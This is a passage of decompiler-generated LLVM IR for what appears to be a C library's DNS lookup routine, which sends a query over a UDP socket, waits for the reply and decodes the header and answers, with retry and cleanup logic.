  br label %dec_label_pc_10008a68

dec_label_pc_10008a68:                            ; preds = %dec_label_pc_10008a3c, %dec_label_pc_10008a54
  %v3_10008a68 = phi i16 [ 10, %dec_label_pc_10008a3c ], [ %v3_10008a68.pre, %dec_label_pc_10008a54 ]
  %v4_10008a68 = sext i16 %v3_10008a68 to i32
  store i32 268470904, i32* @lr, align 4
  %v3_10008a74 = call i32 @socket(i32 %v4_10008a68, i32 2, i32 17)
  store i32 %v3_10008a74, i32* @r19, align 4
  %v1_10008a78 = icmp slt i32 %v3_10008a74, 0
  br i1 %v1_10008a78, label %dec_label_pc_10008aa4, label %dec_label_pc_10008a80

dec_label_pc_10008a80:                            ; preds = %dec_label_pc_10008a68
  store i32 268470924, i32* @lr, align 4
  %v3_10008a88 = call i32 @__libc_connect(i32 %v2_10008a80, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_10008a88, -1
  br i1 %tmp60, label %dec_label_pc_10008aac, label %dec_label_pc_10008a94

dec_label_pc_10008a94:                            ; preds = %dec_label_pc_10008a80
  %v0_10008a94 = call i32 @__errno_location()
  %v1_10008a98 = inttoptr i32 %v0_10008a94 to i32*
  %v2_10008a98 = load i32, i32* %v1_10008a98, align 4
  store i32 %v2_10008a98, i32* %r0.global-to-local, align 4
  %v3_10008a9c = icmp eq i32 %v2_10008a98, 101
  br i1 %v3_10008a9c, label %dec_label_pc_10008de4, label %dec_label_pc_10008aa4

dec_label_pc_10008aa4:                            ; preds = %dec_label_pc_10008a94, %dec_label_pc_10008a68
  %v0_10008aa4 = load i32, i32* %r18.global-to-local, align 4
  %v1_10008aa4 = add i32 %v0_10008aa4, 1
  store i32 %v1_10008aa4, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_10008aa4, 3
  br i1 %tmp61, label %dec_label_pc_100088f4, label %dec_label_pc_10008e18

dec_label_pc_10008aac:                            ; preds = %dec_label_pc_10008a80
  %v0_10008aac = load i32, i32* @r28, align 4
  %v1_10008aac = load i32, i32* @r27, align 4
  %v2_10008aac = add i32 %v1_10008aac, %v0_10008aac
  %v0_10008ab0 = load i32, i32* @r30, align 4
  %v0_10008ab8 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_10008ac0.445 to i32), i32* @lr, align 4
  %v4_10008abc = call i32 @__libc_send(i32 %v0_10008ab8, i32 %v0_10008ab0, i32 %v2_10008aac, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10008ad4 = load i32, i32* @r19, align 4
  store i32 %v0_10008ad4, i32* %stack_var_-248, align 4
  store i32 268471004, i32* @lr, align 4
  %v3_10008ad8 = call i32 @__libc_poll(i32 %v2_10008ac4, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10008ad8, 1
  br i1 %tmp62, label %dec_label_pc_10008de4, label %dec_label_pc_10008ae4

dec_label_pc_10008ae4:                            ; preds = %dec_label_pc_10008aac
  %v0_10008ae4 = load i32, i32* @r19, align 4
  %v0_10008ae8 = load i32, i32* @r30, align 4
  store i32 268471032, i32* @lr, align 4
  %v4_10008af4 = call i32 @__libc_recv(i32 %v0_10008ae4, i32 %v0_10008ae8, i32 512, i32 0)
  store i32 %v4_10008af4, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_10008af4, 12
  br i1 %tmp63, label %dec_label_pc_10008d8c, label %dec_label_pc_10008b04

dec_label_pc_10008b04:                            ; preds = %dec_label_pc_10008ae4
  %v0_10008b04 = load i32, i32* @r30, align 4
  %v2_10008b0c = inttoptr i32 %v0_10008b04 to i8*
  %v3_10008b0c = call i32 @__decode_header(i8* %v2_10008b0c, i32 %v2_1000890c)
  %v3_10008b10 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_10008b10, i32* @r20, align 4
  %v1_10008b14 = load i32, i32* @r25, align 4
  %v4_10008b14 = icmp eq i32 %v3_10008b10, %v1_10008b14
  br i1 %v4_10008b14, label %dec_label_pc_10008b1c, label %dec_label_pc_10008d8c

dec_label_pc_10008b1c:                            ; preds = %dec_label_pc_10008b04
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10008b20, label %dec_label_pc_10008d8c, label %dec_label_pc_10008b28

dec_label_pc_10008b28:                            ; preds = %dec_label_pc_10008b1c
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_10008b2c, label %dec_label_pc_10008b34, label %dec_label_pc_10008b9c

dec_label_pc_10008b34:                            ; preds = %dec_label_pc_10008b28
  %v0_10008b34 = load i32, i32* %r17.global-to-local, align 4
  %v3_10008b34 = icmp eq i32 %v0_10008b34, 0
  br i1 %v3_10008b34, label %dec_label_pc_10008b3c, label %dec_label_pc_10008b90

dec_label_pc_10008b3c:                            ; preds = %dec_label_pc_10008b34
  store i32 ptrtoint (i32* @global_var_1001d7a8.385 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10008898, i32* %r28.global-to-local, align 4
  store i32 %v2_10008898, i32* @r3, align 4
  %v0_10008b58 = call i32 @__pthread_return_void()
  %v0_10008b60 = call i32 @__pthread_return_0()
  %v3_10008b68 = load i32, i32* @global_var_1001d89c.440, align 4
  store i32 %v3_10008b68, i32* %r29.global-to-local, align 4
  store i32 %v2_10008898, i32* @r3, align 4
  %v0_10008b74 = call i32 @__pthread_return_void()
  %v0_10008b78 = load i32, i32* %r29.global-to-local, align 4
  %v1_10008b78 = add i32 %v0_10008b78, -1
  store i32 %v1_10008b78, i32* %r29.global-to-local, align 4
  %v0_10008b7c = load i32, i32* @r22, align 4
  %v2_10008b7c = icmp slt i32 %v0_10008b7c, %v1_10008b78
  br i1 %v2_10008b7c, label %dec_label_pc_10008b84, label %dec_label_pc_10008b90

dec_label_pc_10008b84:                            ; preds = %dec_label_pc_10008b3c
  %v1_10008b84 = add i32 %v0_10008b7c, 1
  store i32 %v1_10008b84, i32* @r22, align 4
  %v0_10008b88 = load i32, i32* @r20, align 4
  store i32 %v0_10008b88, i32* @r25, align 4
  br label %dec_label_pc_10008e00thread-pre-split.backedge

dec_label_pc_10008b90:                            ; preds = %dec_label_pc_10008b3c, %dec_label_pc_10008b34
  %v0_10008b90 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10008bc4

dec_label_pc_10008b9c:                            ; preds = %dec_label_pc_10008b28
  br i1 %v3_10008b9c, label %dec_label_pc_10008ba4, label %dec_label_pc_10008d8c

dec_label_pc_10008ba4:                            ; preds = %dec_label_pc_10008b9c
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_10008bbc, label %dec_label_pc_10008bb0

dec_label_pc_10008bb0:                            ; preds = %dec_label_pc_10008ba4
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_10008bdc10 = load i32, i32* @r30, align 4
  store i32 %v0_10008bdc10, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008bcc

dec_label_pc_10008bbc:                            ; preds = %dec_label_pc_10008ba4
  %v0_10008bbc = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10008bc4

dec_label_pc_10008bc4:                            ; preds = %dec_label_pc_10008b90, %dec_label_pc_10008bbc
  %storemerge3 = phi i32 [ %v0_10008bbc, %dec_label_pc_10008bbc ], [ %v0_10008b90, %dec_label_pc_10008b90 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_10008bbc ], [ 1, %dec_label_pc_10008b90 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10008bc4 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10008bc4, align 4
  br label %dec_label_pc_10008e28

dec_label_pc_10008bcc:                            ; preds = %dec_label_pc_10008bb0, %dec_label_pc_10008bcc
  %v0_10008bdc14 = phi i32 [ %v0_10008bdc10, %dec_label_pc_10008bb0 ], [ %v0_10008bdc, %dec_label_pc_10008bcc ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_10008bb0 ], [ %v2_10008bd0, %dec_label_pc_10008bcc ]
  store i32 268471248, i32* @lr, align 4
  %v2_10008bcc = call i32 @__length_question(i32 %v0_10008bdc14, i32 %storemerge213)
  %v0_10008bd0 = load i32, i32* %r28.global-to-local, align 4
  %v2_10008bd0 = add i32 %v0_10008bd0, %v2_10008bcc
  %v0_10008be0.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10008bd0, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10008bd0, i32* @r4, align 4
  %v0_10008bdc = load i32, i32* @r30, align 4
  store i32 %v0_10008bdc, i32* @r3, align 4
  %v2_10008be0 = icmp slt i32 %v0_10008be0.pr, 1
  %v1_10008be4 = add i32 %v0_10008be0.pr, 1
  store i32 %v1_10008be4, i32* %r29.global-to-local, align 4
  br i1 %v2_10008be0, label %dec_label_pc_10008bcc, label %dec_label_pc_10008bec

dec_label_pc_10008bec:                            ; preds = %dec_label_pc_10008bcc
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_10008ba8, label %dec_label_pc_10008d38, label %dec_label_pc_10008d40

dec_label_pc_10008bfc:                            ; preds = %dec_label_pc_10008d38
  store i32 %v2_10008bfc, i32* %r29.global-to-local, align 4
  %v0_10008c00 = load i32, i32* @r30, align 4
  store i32 268471316, i32* @lr, align 4
  %v5_10008c10 = call i32 @__decode_answer(i32 %v0_10008c00, i32 %v0_10008c04, i32 %v1_10008d38, i32* nonnull %stack_var_-184)
  store i32 %v5_10008c10, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_10008c10, -1
  br i1 %tmp64, label %dec_label_pc_10008c34, label %dec_label_pc_10008c1c

dec_label_pc_10008c1c:                            ; preds = %dec_label_pc_10008bfc
  %v0_10008c1c = load i32, i32* @r24, align 4
  %v3_10008c1c = icmp eq i32 %v0_10008c1c, 0
  br i1 %v3_10008c1c, label %dec_label_pc_10008d8c, label %dec_label_pc_10008c24

dec_label_pc_10008c24:                            ; preds = %dec_label_pc_10008c1c
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10008c28, label %dec_label_pc_10008d8c, label %dec_label_pc_10008d40

dec_label_pc_10008c34:                            ; preds = %dec_label_pc_10008bfc
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10008c38 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10008c38, label %dec_label_pc_10008cdc, label %dec_label_pc_10008c40

dec_label_pc_10008c40:                            ; preds = %dec_label_pc_10008c34
  %v0_10008c40 = load i32, i32* @r31, align 4
  store i32 %v2_10008bfc, i32* @r4, align 4
  %v1_10008c48 = add i32 %v0_10008c40, 28
  %v2_10008c48 = inttoptr i32 %v1_10008c48 to i32*
  %v3_10008c48 = load i32, i32* %v2_10008c48, align 4
  store i32 %v3_10008c48, i32* %r0.global-to-local, align 4
  store i32 %v0_10008c40, i32* @r3, align 4
  %v1_10008c50 = add i32 %v0_10008c40, 36
  %v2_10008c50 = inttoptr i32 %v1_10008c50 to i32*
  %v3_10008c50 = load i32, i32* %v2_10008c50, align 4
  store i32 %v3_10008c50, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268471400, i32* @lr, align 4
  %v0_10008c64 = call i32 @memcpy()
  %v0_10008c68 = load i32, i32* @r31, align 4
  %v1_10008c68 = add i32 %v0_10008c68, 4
  %v2_10008c68 = inttoptr i32 %v1_10008c68 to i32*
  %v3_10008c68 = load i32, i32* %v2_10008c68, align 4
  %v3_10008c6c = icmp eq i32 %v3_10008c68, 24
  br i1 %v3_10008c6c, label %dec_label_pc_10008c40.dec_label_pc_10008c90_crit_edge, label %dec_label_pc_10008c74

dec_label_pc_10008c40.dec_label_pc_10008c90_crit_edge: ; preds = %dec_label_pc_10008c40
  %v1_10008c90.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10008c90

dec_label_pc_10008c74:                            ; preds = %dec_label_pc_10008c40
  %v1_10008c74 = add i32 %v0_10008c68, 28
  %v2_10008c74 = inttoptr i32 %v1_10008c74 to i32*
  %v3_10008c74 = load i32, i32* %v2_10008c74, align 4
  store i32 %v3_10008c74, i32* %r0.global-to-local, align 4
  %v3_10008c78 = icmp eq i32 %v3_10008c74, 0
  br i1 %v3_10008c78, label %dec_label_pc_10008d40, label %dec_label_pc_10008c80

dec_label_pc_10008c80:                            ; preds = %dec_label_pc_10008c74
  %v0_10008c80 = load i32, i32* %r16.global-to-local, align 4
  %v3_10008c80 = icmp eq i32 %v0_10008c80, 1
  br i1 %v3_10008c80, label %dec_label_pc_10008c90, label %dec_label_pc_10008c88

dec_label_pc_10008c88:                            ; preds = %dec_label_pc_10008c80
  %v3_10008c88 = icmp eq i32 %v0_10008c80, 28
  br i1 %v3_10008c88, label %dec_label_pc_10008c90, label %dec_label_pc_10008d40

dec_label_pc_10008c90:                            ; preds = %dec_label_pc_10008c40.dec_label_pc_10008c90_crit_edge, %dec_label_pc_10008c88, %dec_label_pc_10008c80
  %v1_10008c90 = phi i32 [ %v1_10008c90.pre, %dec_label_pc_10008c40.dec_label_pc_10008c90_crit_edge ], [ 28, %dec_label_pc_10008c88 ], [ 1, %dec_label_pc_10008c80 ]
  %v4_10008c90 = icmp eq i32 %v3_10008c68, %v1_10008c90
  br i1 %v4_10008c90, label %dec_label_pc_10008ca4, label %dec_label_pc_10008c98

dec_label_pc_10008c98:                            ; preds = %dec_label_pc_10008c90
  %v1_10008c98 = inttoptr i32 %v0_10008c68 to i32*
  %v2_10008c98 = load i32, i32* %v1_10008c98, align 4
  store i32 %v2_10008c98, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10008ca0.448 to i32), i32* @lr, align 4
  %v0_10008c9c = call i32 @free()
  br label %dec_label_pc_10008d24

dec_label_pc_10008ca4:                            ; preds = %dec_label_pc_10008c90
  %v1_10008ca8 = add i32 %v0_10008c68, 16
  %v2_10008ca8 = inttoptr i32 %v1_10008ca8 to i32*
  %v3_10008ca8 = load i32, i32* %v2_10008ca8, align 4
  store i32 %v3_10008ca8, i32* %r11.global-to-local, align 4
  %v1_10008cac = add i32 %v0_10008c68, 32
  %v2_10008cac = inttoptr i32 %v1_10008cac to i32*
  %v3_10008cac = load i32, i32* %v2_10008cac, align 4
  store i32 %v3_10008cac, i32* %r0.global-to-local, align 4
  %v0_10008cb0 = load i32, i32* @r24, align 4
  %v2_10008cb0 = sub i32 %tmp35, %v0_10008cb0
  %v1_10008cb4 = add i32 %v2_10008cb0, -1
  %v1_10008cb8 = add i32 %v3_10008ca8, 4
  %v2_10008cbc = mul i32 %v1_10008cb4, %v1_10008cb8
  store i32 %v2_10008cbc, i32* %r11.global-to-local, align 4
  %v2_10008cc0 = add i32 %v0_10008c68, 36
  %v3_10008cc0 = inttoptr i32 %v2_10008cc0 to i32*
  store i32 %v1_10008cb4, i32* %v3_10008cc0, align 4
  %v0_10008cc4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008cc4 = load i32, i32* %r0.global-to-local, align 4
  %v3_10008cc4 = icmp ugt i32 %v0_10008cc4, %v1_10008cc4
  br i1 %v3_10008cc4, label %dec_label_pc_10008d40, label %dec_label_pc_10008ccc

dec_label_pc_10008ccc:                            ; preds = %dec_label_pc_10008ca4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10008cd4 = load i32, i32* @r31, align 4
  %v2_10008cd4 = add i32 %v1_10008cd4, 36
  %v3_10008cd4 = inttoptr i32 %v2_10008cd4 to i32*
  store i32 0, i32* %v3_10008cd4, align 4
  br label %dec_label_pc_10008d24

dec_label_pc_10008cdc:                            ; preds = %dec_label_pc_10008c34
  %v3_10008cdc = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_10008cdc, i32* @r3, align 4
  store i32 268471524, i32* @lr, align 4
  %v0_10008ce0 = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10008ce8 = load i32, i32* %r16.global-to-local, align 4
  %v4_10008ce8 = icmp eq i32 %tmp29, %v1_10008ce8
  br i1 %v4_10008ce8, label %dec_label_pc_10008cf0, label %dec_label_pc_10008d24

dec_label_pc_10008cf0:                            ; preds = %dec_label_pc_10008cdc
  %v0_10008cf0 = load i32, i32* @r31, align 4
  %v1_10008cf0 = add i32 %v0_10008cf0, 16
  %v2_10008cf0 = inttoptr i32 %v1_10008cf0 to i32*
  %v3_10008cf0 = load i32, i32* %v2_10008cf0, align 4
  store i32 %v3_10008cf0, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10008cf8 = icmp eq i32 %v3_10008cf0, %tmp28
  br i1 %v4_10008cf8, label %dec_label_pc_10008d00, label %dec_label_pc_10008d84

dec_label_pc_10008d00:                            ; preds = %dec_label_pc_10008cf0
  %v1_10008d00 = add i32 %v0_10008cf0, 36
  %v2_10008d00 = inttoptr i32 %v1_10008d00 to i32*
  %v3_10008d00 = load i32, i32* %v2_10008d00, align 4
  %v1_10008d04 = add i32 %v0_10008cf0, 28
  %v2_10008d04 = inttoptr i32 %v1_10008d04 to i32*
  %v3_10008d04 = load i32, i32* %v2_10008d04, align 4
  store i32 %v3_10008d04, i32* %r0.global-to-local, align 4
  %v2_10008d0c = mul i32 %v3_10008d00, %tmp28
  %v2_10008d10 = add i32 %v3_10008d04, %v2_10008d0c
  store i32 %v2_10008d10, i32* @r3, align 4
  store i32 268471576, i32* @lr, align 4
  %v0_10008d14 = call i32 @memcpy()
  %v0_10008d18 = load i32, i32* @r31, align 4
  %v1_10008d18 = add i32 %v0_10008d18, 36
  %v2_10008d18 = inttoptr i32 %v1_10008d18 to i32*
  %v3_10008d18 = load i32, i32* %v2_10008d18, align 4
  %v1_10008d1c = add i32 %v3_10008d18, 1
  store i32 %v1_10008d1c, i32* %v2_10008d18, align 4
  br label %dec_label_pc_10008d24

dec_label_pc_10008d24:                            ; preds = %dec_label_pc_10008cdc, %dec_label_pc_10008ccc, %dec_label_pc_10008c98, %dec_label_pc_10008d00
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10008d00 ], [ 0, %dec_label_pc_10008cdc ], [ 0, %dec_label_pc_10008ccc ], [ %stack_var_-88.118, %dec_label_pc_10008c98 ]
  %v0_10008d24 = load i32, i32* @r28, align 4
  %v1_10008d24 = load i32, i32* %r15.global-to-local, align 4
  %v2_10008d24 = add i32 %v1_10008d24, %v0_10008d24
  store i32 %v2_10008d24, i32* %r28.global-to-local, align 4
  %v0_10008d28 = load i32, i32* @r24, align 4
  %v1_10008d28 = add i32 %v0_10008d28, 1
  store i32 %v1_10008d28, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10008d30 = icmp slt i32 %v1_10008d28, %tmp35
  br i1 %v2_10008d30, label %dec_label_pc_10008d38, label %dec_label_pc_10008d40

dec_label_pc_10008d38:                            ; preds = %dec_label_pc_10008bec, %dec_label_pc_10008d24
  %v0_10008c04 = phi i32 [ %v2_10008d24, %dec_label_pc_10008d24 ], [ %v2_10008bd0, %dec_label_pc_10008bec ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_10008d24 ], [ 1, %dec_label_pc_10008bec ]
  %v1_10008d38 = load i32, i32* @r27, align 4
  %v2_10008d38 = icmp slt i32 %v0_10008c04, %v1_10008d38
  br i1 %v2_10008d38, label %dec_label_pc_10008bfc, label %dec_label_pc_10008d40

dec_label_pc_10008d40:                            ; preds = %dec_label_pc_10008c24, %dec_label_pc_10008bec, %dec_label_pc_10008d38, %dec_label_pc_10008c74, %dec_label_pc_10008ca4, %dec_label_pc_10008d24, %dec_label_pc_10008c88
  %v0_10008d40 = load i32, i32* @r19, align 4
  store i32 268471624, i32* @lr, align 4
  %v1_10008d44 = call i32 @__libc_close(i32 %v0_10008d40)
  %v3_10008d4c = icmp eq i32 %arg5, 0
  %v0_10008d5c = load i32, i32* @r30, align 4
  br i1 %v3_10008d4c, label %dec_label_pc_10008d5c, label %dec_label_pc_10008d54

dec_label_pc_10008d54:                            ; preds = %dec_label_pc_10008d40
  %v2_10008d54 = inttoptr i32 %arg5 to i32*
  store i32 %v0_10008d5c, i32* %v2_10008d54, align 4
  br label %dec_label_pc_10008d64

dec_label_pc_10008d5c:                            ; preds = %dec_label_pc_10008d40
  store i32 %v0_10008d5c, i32* @r3, align 4
  store i32 268471652, i32* @lr, align 4
  %v0_10008d60 = call i32 @free()
  br label %dec_label_pc_10008d64

dec_label_pc_10008d64:                            ; preds = %dec_label_pc_10008d54, %dec_label_pc_10008d5c
  %v0_10008d64 = load i32, i32* @r21, align 4
  store i32 %v0_10008d64, i32* @r3, align 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268471664, i32* @lr, align 4
  %v0_10008d6c = call i32 @free()
  store i32 ptrtoint (i32* @global_var_1001fec4.436 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008e68

dec_label_pc_10008d84:                            ; preds = %dec_label_pc_10008cf0
  %v1_10008d84 = inttoptr i32 %v0_10008cf0 to i32*
  %v2_10008d84 = load i32, i32* %v1_10008d84, align 4
  store i32 %v2_10008d84, i32* @r3, align 4
  store i32 268471692, i32* @lr, align 4
  %v0_10008d88 = call i32 @free()
  br label %dec_label_pc_10008d8c

dec_label_pc_10008d8c:                            ; preds = %dec_label_pc_10008b9c, %dec_label_pc_10008b04, %dec_label_pc_10008c24, %dec_label_pc_10008c1c, %dec_label_pc_10008b1c, %dec_label_pc_10008ae4, %dec_label_pc_10008d84
  %v0_10008d8c = load i32, i32* %r17.global-to-local, align 4
  %v3_10008d8c = icmp eq i32 %v0_10008d8c, 0
  br i1 %v3_10008d8c, label %dec_label_pc_10008d94, label %dec_label_pc_10008de4

dec_label_pc_10008d94:                            ; preds = %dec_label_pc_10008d8c
  store i32 ptrtoint (i32* @global_var_1001d7a8.385 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10008898, i32* %r28.global-to-local, align 4
  store i32 %v2_10008898, i32* @r3, align 4
  %v0_10008db0 = call i32 @__pthread_return_void()
  %v0_10008db8 = call i32 @__pthread_return_0()
  %v3_10008dc0 = load i32, i32* @global_var_1001d89c.440, align 4
  store i32 %v3_10008dc0, i32* %r29.global-to-local, align 4
  store i32 %v2_10008898, i32* @r3, align 4
  %v0_10008dcc = call i32 @__pthread_return_void()
  %v0_10008dd0 = load i32, i32* %r29.global-to-local, align 4
  %v1_10008dd0 = add i32 %v0_10008dd0, -1
  store i32 %v1_10008dd0, i32* %r29.global-to-local, align 4
  %v0_10008dd4 = load i32, i32* @r22, align 4
  %v2_10008dd4 = icmp slt i32 %v0_10008dd4, %v1_10008dd0
  br i1 %v2_10008dd4, label %dec_label_pc_10008ddc, label %dec_label_pc_10008de4

dec_label_pc_10008ddc:                            ; preds = %dec_label_pc_10008d94
  %v1_10008ddc = add i32 %v0_10008dd4, 1
  store i32 %v1_10008ddc, i32* @r22, align 4
  br label %dec_label_pc_10008e00thread-pre-split.backedge

dec_label_pc_10008e00thread-pre-split.backedge:   ; preds = %dec_label_pc_10008ddc, %dec_label_pc_10008b84, %dec_label_pc_10008dfc
  %v0_10008e00.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_10008e00.pr, 3
  br i1 %tmp65, label %dec_label_pc_100088f4.lr.ph, label %dec_label_pc_10008e18

dec_label_pc_10008de4:                            ; preds = %dec_label_pc_10008a94, %dec_label_pc_10008d94, %dec_label_pc_10008d8c, %dec_label_pc_10008aac
  %v0_10008de4 = load i32, i32* @r26, align 4
  %v1_10008de4 = add i32 %v0_10008de4, 1
  store i32 %v1_10008de4, i32* %r0.global-to-local, align 4
  %v1_10008de8 = load i32, i32* @r23, align 4
  %v2_10008de8 = srem i32 %v1_10008de4, %v1_10008de8
  store i32 %v2_10008de8, i32* @r26, align 4
  %v5_10008df0 = icmp eq i32 %v2_10008de8, 0
  br i1 %v5_10008df0, label %dec_label_pc_10008df8, label %dec_label_pc_10008dfc

dec_label_pc_10008df8:                            ; preds = %dec_label_pc_10008de4
  %v0_10008df8 = load i32, i32* %r18.global-to-local, align 4
  %v1_10008df8 = add i32 %v0_10008df8, 1
  store i32 %v1_10008df8, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_10008dfc

dec_label_pc_10008dfc:                            ; preds = %dec_label_pc_10008de4, %dec_label_pc_10008df8
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10008e00thread-pre-split.backedge

dec_label_pc_100088f4.lr.ph:                      ; preds = %dec_label_pc_100088f4.lr.ph.lr.ph, %dec_label_pc_10008e00thread-pre-split.backedge
  br label %dec_label_pc_100088f4

dec_label_pc_10008e0c:                            ; preds = %dec_label_pc_1000886c, %dec_label_pc_10008864, %dec_label_pc_1000885c, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10008e18

dec_label_pc_10008e18:                            ; preds = %dec_label_pc_10008e00thread-pre-split.backedge, %dec_label_pc_10008904, %dec_label_pc_100089e0, %dec_label_pc_10008aa4, %dec_label_pc_10008878, %dec_label_pc_10008e0c
  %v0_10008e18 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10008e20 = inttoptr i32 %v0_10008e18 to i32*
  store i32 -1, i32* %v2_10008e20, align 4
  %v0_10008e24 = load i32, i32* @r25, align 4
  store i32 %v0_10008e24, i32* @r20, align 4
  br label %dec_label_pc_10008e28

dec_label_pc_10008e28:                            ; preds = %dec_label_pc_10008bc4, %dec_label_pc_10008e18
  %v0_10008e28 = load i32, i32* @r19, align 4
  %v3_10008e28 = icmp eq i32 %v0_10008e28, -1
  br i1 %v3_10008e28, label %dec_label_pc_10008e38, label %dec_label_pc_10008e30

dec_label_pc_10008e30:                            ; preds = %dec_label_pc_10008e28
  store i32 268471864, i32* @lr, align 4
  %v1_10008e34 = call i32 @__libc_close(i32 %v0_10008e28)
  br label %dec_label_pc_10008e38

dec_label_pc_10008e38:                            ; preds = %dec_label_pc_10008e28, %dec_label_pc_10008e30
  %v0_10008e38 = load i32, i32* @r21, align 4
  store i32 %v0_10008e38, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268471876, i32* @lr, align 4
  %v0_10008e40 = call i32 @free()
  %v0_10008e44 = load i32, i32* @r30, align 4
  store i32 %v0_10008e44, i32* @r3, align 4
  store i32 268471884, i32* @lr, align 4
  %v0_10008e48 = call i32 @free()
  %v0_10008e4c = load i32, i32* @r26, align 4
  %v3_10008e4c = icmp eq i32 %v0_10008e4c, -1
  br i1 %v3_10008e4c, label %dec_label_pc_10008e98, label %dec_label_pc_10008e54

dec_label_pc_10008e54:                            ; preds = %dec_label_pc_10008e38
  store i32 ptrtoint (i32* @global_var_1001fec4.436 to i32), i32* %r29.global-to-local, align 4
  %v2_10008e60 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_10008e68

dec_label_pc_10008e68:                            ; preds = %dec_label_pc_10008d64, %dec_label_pc_10008e54
  %storemerge68 = phi i32 [ %v2_10008e60, %dec_label_pc_10008e54 ], [ %v2_10008898, %dec_label_pc_10008d64 ]
  %v1_10008e6c.pre-phi = phi i32 [ %v2_10008e60, %dec_label_pc_10008e54 ], [ %v2_10008898, %dec_label_pc_10008d64 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_10008e6c.pre-phi, i32* @r3, align 4
  %v0_10008e70 = call i32 @__pthread_return_void()
  %v0_10008e78 = call i32 @__pthread_return_0()
  %v0_10008e80 = load i32, i32* @r26, align 4
  store i32 %v0_10008e80, i32* @global_var_1001d894.437, align 4
  store i32 %v1_10008e6c.pre-phi, i32* @r3, align 4
  %v0_10008e90 = load i32, i32* @r20, align 4
  %v1_10008e90 = trunc i32 %v0_10008e90 to i16
  store i16 %v1_10008e90, i16* @global_var_1001d7a4.438, align 2
  %v0_10008e94 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10008e98

dec_label_pc_10008e98:                            ; preds = %dec_label_pc_10008e38, %dec_label_pc_10008e68
  store i32 %v0_10008818, i32* %r0.global-to-local, align 4
  %v0_10008e9c = load i32, i32* @r27, align 4
  ret i32 %v0_10008e9c

; uselistorder directives
  uselistorder i32 %v1_10008e6c.pre-phi, { 1, 0 }
  uselistorder i32 %v2_10008de8, { 1, 0 }
  uselistorder i32 %v0_10008d5c, { 1, 0 }
  uselistorder i32 %v1_10008d38, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_10008c04, { 1, 0 }
  uselistorder i32 %v1_10008d28, { 1, 0 }
  uselistorder i32 %v0_10008cf0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10008cb4, { 1, 0 }
  uselistorder i32 %v0_10008c68, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v0_10008c40, { 2, 1, 0 }
  uselistorder i32 %v0_10008bdc, { 1, 0 }
  uselistorder i32 %v2_10008bd0, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10008af4, { 1, 0 }
  uselistorder i32 %v1_100089f4, { 1, 0 }
  uselistorder i32 %v1_100089c8, { 1, 0 }
  uselistorder i32 %v1_10008994, { 1, 0 }
  uselistorder i32 %v1_1000892c, { 1, 0 }
  uselistorder i32 %v2_10008898, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
